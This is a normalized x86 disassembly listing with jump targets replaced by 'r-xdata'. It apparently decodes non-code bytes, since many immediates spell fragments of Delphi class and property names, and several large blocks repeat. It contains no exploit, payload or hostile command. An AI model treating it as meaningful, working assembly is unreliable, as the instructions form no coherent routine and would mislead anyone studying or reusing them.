push esp
adc [ eax ] al
lea eax [ eax ]
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
jo r-xdata
outsb
je r-xdata
je r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
add [ ebx + 0x43b140c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
inc eax
add ah dh
lodsd [ esi ]
inc ebx
add [ eax ] al
dec esp
inc ecx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
je r-xdata
jb r-xdata
add [ eax ] dl
test eax 0xb35c0043
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
inc ebx
add [ eax ] al
adc [ eax ] al
nop
mov ah 0xb2
inc ebx
add [ eax ] cl
push cs
movsb [ edi ] [ esi ]
mov cl 0x43
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
inc eax
add [ eax ] al
dec esp
inc ecx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x4e5bffc0 ] cl
inc ebx
inc eax
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax 0x80043b3
inc ebx
add [ eax ] cl
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x74 ] si
adc [ eax ] eax
adc [ ecx - 0x4ca3ffbd ] ch
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
or [ esi ] cl
jbe r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx + 0x40 ] dh
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
sub al 0xb2
inc ebx
add [ eax ] cl
push cs
push esp
inc ebx
push 0x74007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp - 0x4dd3ffc0 ] cl
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
je r-xdata
je r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
outsb
je r-xdata
je r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
and [ ebx + eax * 2 + 0x540e0800 ] dh
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc eax
add [ eax + 0x540043ab ] dh
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add [ eax ] cl
inc eax
add [ ecx + edx + 0x40 ] dh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + 0x80043b3 ] bh
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebx
add ecx [ eax ]
push es
adc al 0xb3
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
inc eax
add [ ecx + edx + 0x40 ] dh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x4cebffc0 ] cl
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
outsb
add [ ecx + edx + 0x40 ] dh
jb r-xdata
jbe r-xdata
inc ebp
popad
jb r-xdata
outsb
je r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
pop eax
pop es
dec ecx
imul ecx [ edi + 0x62 ] 0x6a
arpl [ gs : eax + eax + 0x1 ] si
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc ebx
jbe r-xdata
je r-xdata
outsb
je r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc ebx
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43b5f4c0 ] cl
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
or [ ebx + 0x43 ] bh
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
add [ eax ] al
adc [ eax ] al
nop
mov al 0xb4
inc ebx
add [ eax ] cl
or al 0x54
add [ eax + 0x540043ab ] dh
adc [ eax ] al
push esp
adc [ eax ] al
jo r-xdata
inc eax
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
inc eax
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x74 ] si
adc [ eax ] eax
mov al 0xab
inc ebx
add [ eax - 0x4b ] ch
inc ebx
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43b77cc0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax ] cl
mov ebx 0x43
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx + 0x40 ] dh
add [ eax ] cl
mov ebx 0xc2e00043
inc ebx
add [ eax ] al
adc [ eax ] al
sbb al 0xb5
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
pop es
inc edx
outsd
outsd
insb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
jl r-xdata
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
hlt
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
mov ecx 0xbafe0043
inc ebx
add [ ecx + eax ] bl
js r-xdata
insb
outsd
ja r-xdata
insb
inc esp
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
inc ebx
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
je r-xdata
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
inc ecx
add [ eax ] al
cmp al 0x5e
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
add [ ebx + 0x43b6f4c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
inc eax
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add ah al
adc [ eax + eax - 0x80 ] al
xor al [ eax ]
pushfd
xor al [ eax ]
mov dh ch
inc ebx
add [ ebp + ebx + 0x119c0044 ] ah
jo r-xdata
add [ esi + ebx * 2 ] bh
inc ebp
js r-xdata
outsb
je r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
insb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax ] al
dec esp
inc ecx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
mov dh 0x43
add [ eax ] cl
lea eax [ eax ]
xchg esp eax
mov eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ecx - 0x44f3ffbd ] bh
inc ebx
add [ eax ] al
jbe r-xdata
add dh bh
mov edx 0x15c0043
outsb
je r-xdata
add al 0x8
push es
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax ] al
dec esp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
inc esp
add [ ebx + edi * 2 ] dl
inc ecx
add [ ebp + ebx + 0x44 ] ch
add [ eax - 0x13ffbc0f ] al
add [ eax - 0x5bffbc12 ] cl
sbb eax 0x119c0044
push eax
outsd
jae r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_43b065
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or [ ebp + 0x61 ] cl
js r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
push esp
jmp r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
nop
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
outsb
je r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ ecx + edx + 0x40 ] dh
add [ eax + 0x4010 ] al
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ ecx + edx + 0x40 ] dh
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
je r-xdata
inc esp
jb r-xdata
je r-xdata
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push ebx
push 0xb746669
push esp
push 0x53746669
je r-xdata
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
push esp
inc esp
jb r-xdata
add [ eax + r-xdata ] dl
or [ esi ] cl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax - 0x52 ] dh
inc eax
inc esp
jb r-xdata
jbe r-xdata
add [ ecx ] al
push esp
push ebx
popad
je r-xdata
inc edx
jne r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
jo r-xdata
outsb
je r-xdata
dec esp
inc ecx
add [ eax + r-xdata ] dl
adc [ eax ] 0x40
add [ eax ] al
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
je r-xdata
jb r-xdata
add [ eax ] dl
test eax 0xb35c0043
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
inc ebx
add [ eax ] al
adc [ eax ] al
nop
mov ah 0xb2
inc ebx
add [ eax ] cl
push cs
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
inc eax
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax 0x80043b3
inc ebx
add [ eax ] cl
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x74 ] si
adc [ eax ] eax
adc [ ecx - 0x4ca3ffbd ] ch
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
push esp
dec ebx
jns r-xdata
inc ebx
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx + 0x40 ] dh
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
sub al 0xb2
inc ebx
add [ eax ] cl
push cs
push esp
inc ebx
push 0x74007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp - 0x4dd3ffc0 ] cl
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
je r-xdata
je r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
je r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
je r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
and [ ebx + eax * 2 + 0x540e0800 ] dh
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc eax
add [ eax + 0x540043ab ] dh
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add [ eax ] cl
inc eax
add [ ecx + edx + 0x40 ] dh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + 0x80043b3 ] bh
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
movsb [ edi ] [ esi ]
mov cl 0x43
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
inc eax
add [ eax ] al
dec esp
inc ecx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x4e5bffc0 ] cl
inc ebx
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
adc al 0xb3
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
inc eax
add [ ecx + edx + 0x40 ] dh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x4cebffc0 ] cl
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
outsb
add [ ecx + edx + 0x40 ] dh
jb r-xdata
jbe r-xdata
inc ebp
or [ esi ] cl
jbe r-xdata
je r-xdata
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
pop eax
pop es
dec ecx
imul ecx [ edi + 0x62 ] 0x6a
arpl [ gs : eax + eax + 0x1 ] si
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc ebx
jbe r-xdata
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
je r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc ebx
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43b5f4c0 ] cl
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
or [ ebx + 0x43 ] bh
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
add [ eax ] al
adc [ eax ] al
nop
mov al 0xb4
inc ebx
add [ eax ] cl
or al 0x54
add [ eax + 0x540043ab ] dh
adc [ eax ] al
push esp
adc [ eax ] al
jo r-xdata
inc eax
push ebx
add ecx [ eax ]
push es
add [ ebx + 0x43b140c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
inc eax
add ah dh
lodsd [ esi ]
inc ebx
add [ eax ] al
dec esp
inc ecx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
inc eax
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x74 ] si
adc [ eax ] eax
mov al 0xab
inc ebx
add [ eax - 0x4b ] ch
inc ebx
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43b77cc0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax ] cl
mov ebx 0x43
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx + 0x40 ] dh
add [ eax ] cl
mov ebx 0xc2e00043
inc ebx
add [ eax ] al
adc [ eax ] al
sbb al 0xb5
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
pop es
inc edx
outsd
outsd
insb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
jl r-xdata
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
hlt
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
mov ecx 0xbafe0043
inc ebx
add [ ecx + eax ] bl
js r-xdata
insb
outsd
ja r-xdata
insb
inc esp
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
inc ebx
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
je r-xdata
add [ eax ] ecx
dec ebp
